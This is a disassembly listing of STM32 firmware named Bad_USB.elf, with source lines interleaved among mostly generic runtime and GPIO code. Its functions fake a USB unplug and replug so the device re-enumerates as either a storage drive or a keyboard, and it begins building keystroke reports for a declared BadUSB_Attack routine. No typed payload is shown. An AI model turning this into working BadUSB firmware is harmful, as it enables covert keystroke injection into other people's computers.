
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000d11c  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000238  0800d2a8  0800d2a8  0001d2a8  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d4e0  0800d4e0  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d4e0  0800d4e0  0001d4e0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d4e8  0800d4e8  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d4e8  0800d4e8  0001d4e8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d4ec  0800d4ec  0001d4ec  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d4f0  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d730  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d730  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020a9a  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 00005387  00000000  00000000  00040d4d  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b38  00000000  00000000  000460d8  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c7  00000000  00000000  00047c10  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  0002665d  00000000  00000000  000490d7  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025b80  00000000  00000000  0006f734  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d2500  00000000  00000000  000952b4  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f70  00000000  00000000  001677b4  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e724  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d290 	.word	0x0800d290

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d290 	.word	0x0800d290

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fc7c 	bl	8001e38 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 fb04 	bl	8001b64 <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 faf6 	bl	8001b64 <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <SimulateUSB_unplug>:
void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]);
void InterruptTrap(int *InterruptFlag);
int TestHID();
void BadUSB_Attack(int stage);

void SimulateUSB_unplug(){
 8000588:	b580      	push	{r7, lr}
 800058a:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 800058c:	2200      	movs	r2, #0
 800058e:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000592:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000596:	f001 fc4f 	bl	8001e38 <HAL_GPIO_WritePin>
}
 800059a:	bf00      	nop
 800059c:	bd80      	pop	{r7, pc}

0800059e <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 800059e:	b580      	push	{r7, lr}
 80005a0:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 80005a2:	2201      	movs	r2, #1
 80005a4:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80005a8:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80005ac:	f001 fc44 	bl	8001e38 <HAL_GPIO_WritePin>
}
 80005b0:	bf00      	nop
 80005b2:	bd80      	pop	{r7, pc}

080005b4 <SwitchToHID>:

void SwitchToHID(){
 80005b4:	b580      	push	{r7, lr}
 80005b6:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 80005b8:	f7ff ffe6 	bl	8000588 <SimulateUSB_unplug>
	isMSC = 0;
 80005bc:	4b08      	ldr	r3, [pc, #32]	; (80005e0 <SwitchToHID+0x2c>)
 80005be:	2200      	movs	r2, #0
 80005c0:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 80005c2:	2032      	movs	r0, #50	; 0x32
 80005c4:	f000 ff20 	bl	8001408 <HAL_Delay>
	SimulateUSB_plugin();
 80005c8:	f7ff ffe9 	bl	800059e <SimulateUSB_plugin>
	MX_TIM2_Init();
 80005cc:	f000 fd72 	bl	80010b4 <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 80005d0:	f00b ffec 	bl	800c5ac <MX_USB_DEVICE_Init>
	HAL_Delay(SwitchDeviceSlot);
 80005d4:	f640 30b8 	movw	r0, #3000	; 0xbb8
 80005d8:	f000 ff16 	bl	8001408 <HAL_Delay>
}
 80005dc:	bf00      	nop
 80005de:	bd80      	pop	{r7, pc}
 80005e0:	20000978 	.word	0x20000978

080005e4 <SwitchToMSC>:

void SwitchToMSC(){
 80005e4:	b580      	push	{r7, lr}
 80005e6:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 80005e8:	f7ff ffce 	bl	8000588 <SimulateUSB_unplug>
	isMSC = 1;
 80005ec:	4b07      	ldr	r3, [pc, #28]	; (800060c <SwitchToMSC+0x28>)
 80005ee:	2201      	movs	r2, #1
 80005f0:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 80005f2:	2032      	movs	r0, #50	; 0x32
 80005f4:	f000 ff08 	bl	8001408 <HAL_Delay>
	SimulateUSB_plugin();
 80005f8:	f7ff ffd1 	bl	800059e <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 80005fc:	f00c f806 	bl	800c60c <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(SwitchDeviceSlot);
 8000600:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000604:	f000 ff00 	bl	8001408 <HAL_Delay>
}
 8000608:	bf00      	nop
 800060a:	bd80      	pop	{r7, pc}
 800060c:	20000978 	.word	0x20000978

08000610 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 8000610:	b580      	push	{r7, lr}
 8000612:	b0a4      	sub	sp, #144	; 0x90
 8000614:	af00      	add	r7, sp, #0
 8000616:	4603      	mov	r3, r0
 8000618:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800061a:	220f      	movs	r2, #15
 800061c:	2100      	movs	r1, #0
 800061e:	4821      	ldr	r0, [pc, #132]	; (80006a4 <Get_Single_Descriptor+0x94>)
 8000620:	f00c fdfc 	bl	800d21c <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000624:	4a20      	ldr	r2, [pc, #128]	; (80006a8 <Get_Single_Descriptor+0x98>)
 8000626:	f107 0308 	add.w	r3, r7, #8
 800062a:	4611      	mov	r1, r2
 800062c:	2286      	movs	r2, #134	; 0x86
 800062e:	4618      	mov	r0, r3
 8000630:	f00c fe20 	bl	800d274 <memcpy>
	Convert2CapsMap(Map);
 8000634:	f107 0308 	add.w	r3, r7, #8
 8000638:	4618      	mov	r0, r3
